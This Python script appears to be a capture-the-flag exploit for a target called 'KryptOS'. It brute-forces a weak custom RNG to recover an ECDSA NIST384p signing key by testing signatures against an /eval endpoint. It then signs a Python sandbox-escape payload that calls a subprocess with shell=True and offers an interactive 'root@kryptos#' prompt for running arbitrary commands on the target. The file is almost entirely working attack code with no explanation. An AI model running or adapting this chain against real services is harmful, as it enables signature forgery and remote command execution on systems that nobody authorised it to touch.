import hashlib
import binascii
import requests as r
from ecdsa import VerifyingKey, SigningKey, NIST384p

p = 2147483647
g = 2255412

def getCongruence():

    order_p = [1]
    k = 1
    while True:
        gk_mod_p = pow(g, k ,p)
        if gk_mod_p == order_p[0]: break
        else:
            order_p.append(gk_mod_p)
            k += 1
    return order_p

def generateRandomNumber(seed):

    ret = 0
    for i in range(32 * 8):
        seed = pow(g,seed,p)
        if seed > (p-1)/2:
            ret += 2**i
    return ret

def getUniqueNumbers(order_p):

    rng_unique = []
    for i in order_p:
        num = generateRandomNumber(i)
        if num not in rng_unique: rng_unique.append(num)

    return rng_unique

def getExponent(unique_rng_values):

    for i in unique_rng_values:
        sk = SigningKey.from_secret_exponent(i+1, curve=NIST384p)
        signature = binascii.hexlify(sk.sign(str.encode('2+2')))
        req = requestEval("2+2", signature)
         
        if "Bad signature" not in req.text: return i+1

def requestEval(message, signature):
    data = {
        "expr": message,
        "sig": signature.decode()        
    }
    return r.post("http://127.0.0.1:81/eval", json=data)

# ===MAIN-FUNCTION==================================================

__import__("os").system("clear")

print("\n[KryptOS RNG Enumeration]\n")
lambda_p = getCongruence()
print("\t[+] order(p,g) = {}".format(len(lambda_p)))

unique_rng_values = getUniqueNumbers(getCongruence())
print("\t[+] The are {} possible RNG values\n".format(len(unique_rng_values)))

print("[BRUTEFORCING THE rand VALUE]\n")
exponent = getExponent(unique_rng_values)
print("\t[+] ECDSA Signing Key Exponent: {}\n".format(exponent))

sk = SigningKey.from_secret_exponent(exponent, curve=NIST384p)
message = '[x for x in ().__class__.__base__.__subclasses__()][250]'
while True:
    command = input("root@kryptos# ").strip()
    execute = '("' + command + '", shell=True, stdout=-1).communicate()'

    payload = message + execute
    signature = binascii.hexlify(sk.sign(str.encode(payload)))
    stdout = requestEval(payload, signature).json()['response']['Result']

    print(bytes(stdout[3:-8], "utf-8").decode("unicode_escape"))
